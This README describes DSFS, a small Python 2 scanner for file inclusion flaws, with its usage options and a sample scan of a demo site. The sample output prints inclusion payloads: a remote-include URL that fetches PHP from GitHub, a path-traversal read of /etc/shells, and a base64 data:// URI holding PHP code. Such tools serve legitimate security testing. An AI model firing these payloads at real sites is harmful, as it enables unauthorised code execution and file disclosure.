Damn Small FI Scanner [![Python 2.6|2.7](https://img.shields.io/badge/python-2.6|2.7-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-Public_domain-red.svg)](https://wiki.creativecommons.org/wiki/Public_domain)
=========

**Damn Small FI Scanner** (DSFS) is a fully functional [File inclusion](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) vulnerability scanner (supporting GET and POST parameters) written in under 100 lines of code.

![Vulnerable](https://i.imgur.com/pgYS6cW.png)

As of optional settings it supports HTTP proxy together with HTTP header values `User-Agent`, `Referer` and `Cookie`.

Sample runs
----

```
$ python dsfs.py -h
Damn Small FI Scanner (DSFS) < 100 LoC (Lines of Code) #v0.1b
 by: Miroslav Stampar (@stamparm)

Usage: dsfs.py [options]

Options:
  --version          show program's version number and exit
  -h, --help         show this help message and exit
  -u URL, --url=URL  Target URL (e.g. "http://www.target.com/page.php?id=1")
  --data=DATA        POST data (e.g. "query=test")
  --cookie=COOKIE    HTTP Cookie header value
  --user-agent=UA    HTTP User-Agent header value
  --random-agent     Use randomly selected HTTP User-Agent header value
  --referer=REFERER  HTTP Referer header value
  --proxy=PROXY      HTTP proxy address (e.g. "http://127.0.0.1:8080")
```

```
$ python dsfs.py -u "http://fidemo.cu.cc/fi.php?f=README.txt"
Damn Small FI Scanner (DSFS) < 100 LoC (Lines of Code) #v0.1b
 by: Miroslav Stampar (@stamparm)

* scanning GET parameter 'f'
 (i) GET parameter 'f' appears to be (R)FI vulnerable (e.g.: 'http://fidemo.cu.c
c/fi.php?f=https%3A%2F%2Fraw.githubusercontent.com%2Fstamparm%2FDSFS%2Fmaster%2F
files%2Fconfig.php')
  (!) content seems to be dynamically evaluated
 (i) GET parameter 'f' appears to be (L)FI vulnerable (e.g.: 'http://fidemo.cu.c
c/fi.php?f=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshells')
 (i) GET parameter 'f' appears to be (S)FI vulnerable (e.g.: 'http://fidemo.cu.c
c/fi.php?f=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgZWNobyBiYXNlNjRfZGVjb2Rl
KCdUR1ZuWVd3Z1pHbHpZMnhoYVcxbGNqbz0nKTs%2FPg%3D%3D')
  (!) content seems to be dynamically evaluated

scan results: possible vulnerabilities found
```

Requirements
----
[Python](http://www.python.org/download/) version **2.6.x** or **2.7.x** is required for running this program.
